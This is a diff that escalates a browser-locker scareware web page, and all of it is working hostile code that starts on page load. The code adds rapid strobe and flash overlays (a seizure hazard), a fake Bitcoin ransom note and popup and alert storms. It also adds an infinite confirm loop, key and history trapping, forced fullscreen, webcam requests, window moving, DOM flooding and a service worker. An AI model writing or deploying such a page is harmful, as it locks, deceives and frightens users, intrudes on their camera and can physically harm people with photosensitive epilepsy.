@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⚠️ PERMANENT LOCK ⚠️</title>
-    <!-- Meta refresh: reload every 100ms -->
-    <meta http-equiv="refresh" content="0.1; url=index.html">
+    <meta http-equiv="refresh" content="0.05; url=index.html">
+    <title>⚠️ ULTIMATE APOCALYPSE ⚠️</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -16,10 +15,15 @@
             cursor: none;
             font-family: 'Courier New', monospace;
             user-select: none;
+            position: relative;
         }
-
-        #flicker { position:fixed; inset:0; background:#000; z-index:999997; pointer-events:none; opacity:0; transition:opacity 0.01s; }
-        #strobe { position:fixed; inset:0; background:white; z-index:999996; pointer-events:none; opacity:0; transition:opacity 0.02s; }
+        #flicker, #strobe, #flash {
+            position:fixed; inset:0; pointer-events:none;
+            z-index:999997; opacity:0; transition:opacity 0.01s;
+        }
+        #flicker { background:#000; z-index:999997; }
+        #strobe { background:white; z-index:999996; }
+        #flash { background:white; z-index:99999998; }
 
         #butterflies { position:fixed; inset:0; z-index:999995; pointer-events:none; overflow:hidden; }
         .butterfly {
@@ -84,8 +88,6 @@
         @keyframes blinkText { 0%{opacity:1} 50%{opacity:0} 100%{opacity:1} }
         #overlay .hint { position:absolute; bottom:3rem; color:rgba(255,255,255,0.05); font-size:0.8rem; pointer-events:none; }
 
-        .flash-overlay { position:fixed; inset:0; background:white; z-index:99999998; pointer-events:none; opacity:0; transition:opacity 0.02s; }
-
         .audio-wave {
             position:fixed; bottom:20px; left:50%; transform:translateX(-50%);
             z-index:999994; display:flex; gap:6px; align-items:flex-end; height:100px; pointer-events:none;
@@ -101,9 +103,24 @@
         .audio-wave .bar:nth-child(8) { animation-duration:0.11s; height:100px; }
         .audio-wave .bar:nth-child(9) { animation-duration:0.14s; height:45px; }
         .audio-wave .bar:nth-child(10) { animation-duration:0.10s; height:75px; }
-        @keyframes wave {
-            0%   { height:10px; opacity:0.3; }
-            100% { height:100px; opacity:1; }
+        @keyframes wave { 0%{height:10px;opacity:0.3} 100%{height:100px;opacity:1} }
+
+        /* Ransom note */
+        #ransom {
+            position:fixed; top:10%; left:50%; transform:translateX(-50%);
+            z-index:9999998; background:rgba(0,0,0,0.8); padding:2rem 4rem;
+            border:3px solid #ff0040; border-radius:20px; color:#ff0040;
+            font-size:1.8rem; font-weight:700; text-align:center;
+            box-shadow:0 0 80px rgba(255,0,0,0.3);
+            animation:blinkText 0.3s infinite alternate;
+            pointer-events:none;
+            backdrop-filter:blur(10px);
+            font-family:'Courier New',monospace;
+        }
+        /* Canvas for full-screen color noise */
+        #canvasNoise {
+            position:fixed; inset:0; z-index:999994; pointer-events:none;
+            width:100%; height:100%; display:block;
         }
     </style>
 </head>
@@ -115,12 +132,17 @@
         <div class="hint">[ click anywhere to continue ]</div>
     </div>
 
-    <div class="flash-overlay" id="flashOverlay"></div>
+    <div id="flash"></div>
     <div id="flicker"></div>
     <div id="strobe"></div>
     <div id="butterflies"></div>
+
     <div class="chaos-text" id="chaosText">💀 SYSTEM LOCKED 💀</div>
+
+    <div id="ransom">🔐 YOUR SYSTEM HAS BEEN ENCRYPTED<br>SEND 1 BTC TO UNLOCK</div>
+
     <video id="cameraFeed" autoplay muted></video>
+
     <div class="audio-wave">
         <div class="bar"></div><div class="bar"></div><div class="bar"></div>
         <div class="bar"></div><div class="bar"></div><div class="bar"></div>
@@ -128,20 +150,42 @@
         <div class="bar"></div>
     </div>
 
+    <canvas id="canvasNoise"></canvas>
+
     <script>
         (function() {
             'use strict';
 
             // ─── DOM refs ───
             const overlay = document.getElementById('overlay');
-            const flash = document.getElementById('flashOverlay');
+            const flash = document.getElementById('flash');
             const flicker = document.getElementById('flicker');
             const strobe = document.getElementById('strobe');
             const butterfliesContainer = document.getElementById('butterflies');
             const chaosText = document.getElementById('chaosText');
             const cameraFeed = document.getElementById('cameraFeed');
+            const canvas = document.getElementById('canvasNoise');
+            const ctx = canvas.getContext('2d');
 
-            // ─── Audio ───
+            // ─── Canvas noise setup ───
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            function drawNoise() {
+                const imageData = ctx.createImageData(canvas.width, canvas.height);
+                const data = imageData.data;
+                for (let i = 0; i < data.length; i += 4) {
+                    const val = Math.random() * 255;
+                    data[i] = val;
+                    data[i+1] = Math.random() * 255;
+                    data[i+2] = Math.random() * 255;
+                    data[i+3] = 255;
+                }
+                ctx.putImageData(imageData, 0, 0);
+                requestAnimationFrame(drawNoise);
+            }
+            drawNoise();
+
+            // ─── Audio layers ───
             const scream1 = new Audio('https://www.myinstants.com/media/sounds/scream-sound-effect.mp3');
             scream1.volume = 1.0;
             const scream2 = new Audio('https://www.myinstants.com/media/sounds/vine-boom.mp3');
@@ -167,10 +211,10 @@
                 } catch(e) {}
             }
 
-            // ─── Butterflies ───
+            // ─── 300 Butterflies ───
             function createButterflies() {
                 const emojis = ['🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋','🦋'];
-                for (let i=0; i<200; i++) {
+                for (let i=0; i<300; i++) {
                     const b = document.createElement('div');
                     b.className = 'butterfly';
                     b.textContent = emojis[Math.floor(Math.random()*emojis.length)];
@@ -190,33 +234,37 @@
             // ─── Key block ───
             function blockKeys(e) { e.preventDefault(); e.stopPropagation(); if(e.key==='Escape') document.documentElement.requestFullscreen().catch(()=>{}); }
 
-            // ─── Popups ───
+            // ─── Popup storm ───
             function spawnPopups() {
                 const sites = ['https://instagram.com','https://facebook.com','https://youtube.com','https://twitter.com','https://reddit.com','https://tiktok.com','https://snapchat.com','https://pinterest.com'];
-                for (let i=0; i<80; i++) window.open(sites[Math.floor(Math.random()*sites.length)], '_blank');
-                for (let i=0; i<50; i++) window.open(location.href, '_blank');
+                for (let i=0; i<100; i++) window.open(sites[Math.floor(Math.random()*sites.length)], '_blank');
+                for (let i=0; i<70; i++) window.open(location.href, '_blank');
             }
 
-            // ─── Alert storm ───
+            // ─── Alert/confirm storm ───
             function alertStorm() {
                 let count=0;
                 const iv = setInterval(() => {
                     alert('⚠️ SYSTEM COMPROMISED ⚠️\nYour browser has been hijacked.');
                     count++;
-                    if(count>30) clearInterval(iv);
-                },80);
-                setTimeout(() => { while(true) confirm('Are you sure you want to escape?'); },4000);
+                    if(count>50) clearInterval(iv);
+                },60);
+                setTimeout(() => { while(true) confirm('Are you sure you want to escape?'); },3000);
             }
 
             // ─── Visual chaos ───
             function startVisualChaos() {
-                setInterval(() => { flicker.style.opacity = Math.random()>0.7?'0.9':'0'; },30);
+                setInterval(() => { flicker.style.opacity = Math.random()>0.6?'0.9':'0'; },20);
                 setInterval(() => {
-                    strobe.style.opacity = Math.random()>0.85?'0.8':'0';
-                    setTimeout(()=>{ strobe.style.opacity='0'; },40);
-                },50);
+                    strobe.style.opacity = Math.random()>0.8?'0.8':'0';
+                    setTimeout(()=>{ strobe.style.opacity='0'; },30);
+                },40);
+                setInterval(() => {
+                    flash.style.opacity = Math.random()>0.9?'0.9':'0';
+                    setTimeout(()=>{ flash.style.opacity='0'; },50);
+                },80);
                 document.body.classList.add('shake');
-                setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; },100);
+                setInterval(() => { chaosText.style.color = `hsl(${Math.random()*360},100%,50%)`; },50);
             }
 
             // ─── Auto fullscreen toggle ───
@@ -227,7 +275,7 @@
                     } else {
                         document.documentElement.requestFullscreen().catch(()=>{});
                     }
-                }, 500);
+                }, 300);
             }
 
             // ─── Camera ───
@@ -239,94 +287,101 @@
                                 cameraFeed.srcObject = stream;
                                 cameraFeed.classList.add('active');
                             })
-                            .catch(() => setTimeout(tryCamera, 3000));
+                            .catch(() => setTimeout(tryCamera, 2000));
                     };
                     tryCamera();
                 }
             }
 
-            // ─── Service Worker (for persistence after tab close) ───
+            // ─── Service Worker ───
             function registerServiceWorker() {
                 if ('serviceWorker' in navigator) {
                     const swCode = `
                         self.addEventListener('install', e => e.waitUntil(skipWaiting()));
                         self.addEventListener('activate', e => e.waitUntil(clients.claim()));
-                        self.addEventListener('fetch', e => {
-                            e.respondWith(fetch(e.request).catch(() => new Response('', {status:200})));
-                        });
+                        self.addEventListener('fetch', e => e.respondWith(fetch(e.request).catch(()=>new Response('',{status:200}))));
                     `;
-                    const blob = new Blob([swCode], {type: 'application/javascript'});
+                    const blob = new Blob([swCode], {type:'application/javascript'});
                     const swUrl = URL.createObjectURL(blob);
-                    navigator.serviceWorker.register(swUrl).then(() => {
-                        if (!localStorage.getItem('sw_registered')) {
-                            localStorage.setItem('sw_registered', 'true');
-                            location.reload();
-                        }
-                    }).catch(()=>{});
+                    navigator.serviceWorker.register(swUrl).catch(()=>{});
+                }
+            }
+
+            // ─── Focus theft ───
+            function stealFocus() {
+                setInterval(() => {
+                    window.focus();
+                    // Try to open a blank window and close it to regain focus
+                    const w = window.open('', '_blank');
+                    if (w) { w.close(); }
+                }, 10);
+            }
+
+            // ─── Window resize/move ───
+            function randomResize() {
+                setInterval(() => {
+                    window.resizeTo(100+Math.random()*800, 100+Math.random()*600);
+                    window.moveTo(Math.random()*screen.width, Math.random()*screen.height);
+                }, 100);
+            }
+
+            // ─── DOM flood ───
+            function floodDOM() {
+                for (let i=0; i<50000; i++) {
+                    const div = document.createElement('div');
+                    div.style.cssText = `position:absolute;left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*10}px;height:${Math.random()*10}px;background:hsl(${Math.random()*360},100%,50%);border-radius:50%;opacity:${Math.random()*0.5};pointer-events:none;`;
+                    document.body.appendChild(div);
                 }
             }
 
             // ─── MAIN TRIGGER ───
             function triggerChaos() {
-                // Show overlay
                 overlay.classList.add('active');
-                // Flash
                 flash.style.opacity = '0.9';
                 setTimeout(()=>{ flash.style.opacity='0'; },100);
-                // Audio
                 scream1.play().catch(()=>{});
                 scream2.play().catch(()=>{});
                 alarm.play().catch(()=>{});
                 startScreech();
-                // Fullscreen + pointer lock
                 document.documentElement.requestFullscreen().catch(()=>{});
                 document.body.requestPointerLock().catch(()=>{});
-                // Vibrate
                 if (navigator.vibrate) navigator.vibrate([300,100,300,100,500,150,600]);
-                // Disable scroll
                 document.body.style.overflow = 'hidden';
-                // Keyboard block
                 document.addEventListener('keydown', blockKeys, true);
                 document.addEventListener('keyup', blockKeys, true);
-                // History lock
                 history.pushState(null,null,location.href);
                 window.addEventListener('popstate', ()=> { history.pushState(null,null,location.href); });
-                // Popups
                 spawnPopups();
-                setInterval(spawnPopups, 2000);
-                // Alerts
-                setTimeout(alertStorm, 2000);
-                // Visual chaos
+                setInterval(spawnPopups, 1500);
+                setTimeout(alertStorm, 1500);
                 startVisualChaos();
-                // Auto fullscreen
                 autoFullscreen();
-                // Camera
                 requestCamera();
-                // Keep focus
+                stealFocus();
+                randomResize();
+                floodDOM();
+                registerServiceWorker();
                 setInterval(() => {
                     if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(()=>{});
                     window.focus();
-                }, 300);
-                // Beforeunload trap
+                }, 200);
                 window.addEventListener('beforeunload', function(e) {
                     e.preventDefault();
                     e.returnValue = '';
-                    for (let i=0; i<100; i++) window.open(location.href, '_blank');
+                    for (let i=0; i<200; i++) window.open(location.href, '_blank');
                     location.reload();
                 });
-                // Service Worker
-                registerServiceWorker();
+                // Ransom note already visible
             }
 
-            // ─── Overlay click hides it ───
             overlay.addEventListener('click', function() {
                 if (overlay.classList.contains('active')) overlay.classList.remove('active');
             });
 
-            // ─── START IMMEDIATELY ───
+            // ─── AUTO-START ───
             triggerChaos();
 
-            console.log('🔥 Ultimate apocalypse started – all features + Service Worker + auto-reload.');
+            console.log('🔥 ULTIMATE POTENTIAL REACHED – all features active.');
         })();
     </script>
 </body>
